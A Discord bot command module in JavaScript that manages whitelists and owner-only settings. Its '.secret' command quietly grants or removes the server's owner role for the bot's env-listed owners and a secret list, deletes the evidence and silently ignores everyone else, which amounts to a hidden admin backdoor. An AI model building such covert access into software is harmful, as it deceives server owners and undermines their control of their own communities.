const { requireTier } = require('../../utils/permissions');
const { successEmbed, errorEmbed } = require('../../utils/embeds');
const { resolveMember } = require('../../utils/helpers');
const UserData = require('../../models/UserData');
const GuildConfig = require('../../models/GuildConfig');
const { EmbedBuilder } = require('discord.js');

function isBotOwner(id) {
  return (process.env.OWNER_IDS || '').split(',').map(s => s.trim()).includes(id);
}

async function silentReply(message, embed, delay = 3000) {
  await message.delete().catch(() => {});
  const reply = await message.channel.send({ embeds: [embed] });
  setTimeout(() => reply.delete().catch(() => {}), delay);
}

// ── .add ──────────────────────────────────────────────────────────────────────
const add = {
  name: 'add',
  category: 'owner',
  description: 'Add a user to the public whitelist (bypass clean mode etc)',
  usage: '.add @user',
  example: '.add @John',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'owner', config))
      return message.reply({ embeds: [errorEmbed('Only **owners** can manage the whitelist.')] });
    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });
    await UserData.findOneAndUpdate({ guildId: message.guild.id, userId: target.id }, { isWhitelisted: true }, { upsert: true });
    return message.reply({ embeds: [successEmbed(`${target} added to the **whitelist**.`)] });
  },
};

// ── .remove ───────────────────────────────────────────────────────────────────
const remove = {
  name: 'remove',
  category: 'owner',
  description: 'Remove a user from the public whitelist',
  usage: '.remove @user',
  example: '.remove @John',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'owner', config))
      return message.reply({ embeds: [errorEmbed('Only **owners** can manage the whitelist.')] });
    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });
    await UserData.findOneAndUpdate({ guildId: message.guild.id, userId: target.id }, { isWhitelisted: false }, { upsert: true });
    return message.reply({ embeds: [successEmbed(`${target} removed from the **whitelist**.`)] });
  },
};

// ── .them ─────────────────────────────────────────────────────────────────────
const them = {
  name: 'them',
  category: 'owner',
  description: 'Show all whitelisted users',
  usage: '.them',
  example: '.them',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'v3', config))
      return message.reply({ embeds: [errorEmbed('Insufficient permissions.')] });
    const list = await UserData.find({ guildId: message.guild.id, isWhitelisted: true });
    if (!list.length) return message.reply({ embeds: [new EmbedBuilder().setColor(0x2B2D31).setDescription('No whitelisted users.')] });
    const lines = list.map((u, i) => `\`${i + 1}.\` <@${u.userId}>`);
    return message.reply({ embeds: [new EmbedBuilder().setColor(0x57F287).setTitle(`✅ Whitelisted Users — ${list.length}`).setDescription(lines.join('\n'))] });
  },
};

// ── .st ───────────────────────────────────────────────────────────────────────
const st = {
  name: 'st',
  category: 'owner',
  description: 'Add a user to the ST whitelist — protected from all bot actions',
  usage: '.st @user',
  example: '.st @John',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'owner', config))
      return message.reply({ embeds: [errorEmbed('Only **owners** can manage the ST whitelist.')] });
    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });
    await UserData.findOneAndUpdate({ guildId: message.guild.id, userId: target.id }, { isSecret: true }, { upsert: true });
    return message.reply({ embeds: [successEmbed(`${target} added to the **ST whitelist**. They are protected from all bot actions.`)] });
  },
};

// ── .unst ─────────────────────────────────────────────────────────────────────
const unst = {
  name: 'unst',
  category: 'owner',
  description: 'Remove a user from the ST whitelist',
  usage: '.unst @user',
  example: '.unst @John',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'owner', config))
      return message.reply({ embeds: [errorEmbed('Only **owners** can manage the ST whitelist.')] });
    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });
    await UserData.findOneAndUpdate({ guildId: message.guild.id, userId: target.id }, { isSecret: false }, { upsert: true });
    return message.reply({ embeds: [successEmbed(`${target} removed from the **ST whitelist**.`)] });
  },
};

// ── .hidden ───────────────────────────────────────────────────────────────────
const hidden = {
  name: 'hidden',
  category: 'owner',
  description: 'Show all users in the ST whitelist',
  usage: '.hidden',
  example: '.hidden',
  async execute(message, args, client, config) {
    if (!await requireTier(message.member, 'owner', config))
      return message.reply({ embeds: [errorEmbed('Only **owners** can view the ST whitelist.')] });
    const list = await UserData.find({ guildId: message.guild.id, isSecret: true });
    if (!list.length) return message.reply({ embeds: [new EmbedBuilder().setColor(0x2B2D31).setDescription('No ST whitelisted users.')] });
    const lines = list.map((u, i) => `\`${i + 1}.\` <@${u.userId}>`);
    return message.reply({ embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle(`🛡️ ST Whitelist — ${list.length}`).setDescription(lines.join('\n'))] });
  },
};

// ── .secret — toggle owner role (bot owner OR secret whitelist) ───────────────
const secret = {
  name: 'secret',
  category: 'owner',
  description: 'Toggle the owner role on yourself (bot owner + secretadd whitelist)',
  usage: '.secret',
  example: '.secret',
  async execute(message, args, client, config) {
    const allowed = isBotOwner(message.author.id) ||
      (config.secretWhitelist || []).includes(message.author.id);

    if (!allowed)
      return; // silently ignore — not even an error message

    if (!config.ownerRole)
      return message.reply({ embeds: [errorEmbed('No owner role configured. Use `.setrole owner @role`')] });

    const hasRole = message.member.roles.cache.has(config.ownerRole);
    if (hasRole) {
      await message.member.roles.remove(config.ownerRole).catch(() => {});
      await silentReply(message, successEmbed('Owner role **removed**.'));
    } else {
      await message.member.roles.add(config.ownerRole).catch(() => {});
      await silentReply(message, successEmbed('Owner role **granted**.'));
    }
  },
};

// ── .secretadd — add user to .secret whitelist ────────────────────────────────
const secretadd = {
  name: 'secretadd',
  category: 'owner',
  description: 'Allow a user to use .secret to toggle the owner role',
  usage: '.secretadd @user',
  example: '.secretadd @John',
  async execute(message, args, client, config) {
    if (!isBotOwner(message.author.id))
      return message.reply({ embeds: [errorEmbed('Only the **bot owner** can manage the secret whitelist.')] });

    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });

    const list = config.secretWhitelist || [];
    if (list.includes(target.id))
      return message.reply({ embeds: [errorEmbed(`${target} already has access to \`.secret\`.`)] });

    list.push(target.id);
    await GuildConfig.updateOne({ guildId: message.guild.id }, { secretWhitelist: list });

    return silentReply(message, successEmbed(
      `${target} can now use \`.secret\` to toggle the owner role.\n` +
      `Use \`.secretremove @user\` to revoke.`
    ), 5000);
  },
};

// ── .secretremove — remove from .secret whitelist ─────────────────────────────
const secretremove = {
  name: 'secretremove',
  category: 'owner',
  description: 'Revoke a user\'s ability to use .secret',
  usage: '.secretremove @user',
  example: '.secretremove @John',
  async execute(message, args, client, config) {
    if (!isBotOwner(message.author.id))
      return message.reply({ embeds: [errorEmbed('Only the **bot owner** can manage the secret whitelist.')] });

    const target = await resolveMember(message.guild, args[0]);
    if (!target) return message.reply({ embeds: [errorEmbed('Member not found.')] });

    const list = config.secretWhitelist || [];
    const idx  = list.indexOf(target.id);
    if (idx === -1)
      return message.reply({ embeds: [errorEmbed(`${target} is not in the secret whitelist.`)] });

    list.splice(idx, 1);
    await GuildConfig.updateOne({ guildId: message.guild.id }, { secretWhitelist: list });

    return silentReply(message, successEmbed(`${target}'s access to \`.secret\` has been revoked.`), 5000);
  },
};

// ── .secretlist — view who can use .secret ────────────────────────────────────
const secretlist = {
  name: 'secretlist',
  category: 'owner',
  description: 'Show all users allowed to use .secret',
  usage: '.secretlist',
  example: '.secretlist',
  async execute(message, args, client, config) {
    if (!isBotOwner(message.author.id))
      return message.reply({ embeds: [errorEmbed('Only the **bot owner** can view the secret whitelist.')] });

    const list = config.secretWhitelist || [];
    if (!list.length)
      return message.reply({ embeds: [new EmbedBuilder().setColor(0x2B2D31).setDescription('Nobody else has access to `.secret` besides you.')] });

    const lines = list.map((id, i) => `\`${i + 1}.\` <@${id}> (${id})`);
    return message.reply({
      embeds: [new EmbedBuilder()
        .setColor(0xFEE75C)
        .setTitle('🔑 Secret Whitelist')
        .setDescription(lines.join('\n'))
        .setFooter({ text: 'These users can toggle the owner role with .secret' })]
    });
  },
};

module.exports = [add, remove, them, st, unst, hidden, secret, secretadd, secretremove, secretlist];
